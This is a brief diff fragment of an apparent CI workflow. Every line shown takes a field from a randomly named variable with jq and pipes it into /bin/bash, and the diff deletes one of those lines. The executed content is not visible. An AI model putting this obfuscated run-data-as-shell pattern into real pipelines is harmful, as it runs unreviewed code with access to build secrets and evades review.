@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$z3242" | jq -r .p6 | /bin/bash
           echo $fvu5721 | jq -r .wly57616 | /bin/bash
           echo $ji9 | jq -r .mpvag14142 | /bin/bash
-          echo $jqcic41949 | jq -r .pimcq81 | /bin/bash
           echo $chde3 | jq -r .nj7049 | /bin/bash
           echo $p4 | jq -r .h669 | /bin/bash
           printf '%s' "$izj0833" | jq -r .v9 | /bin/bash
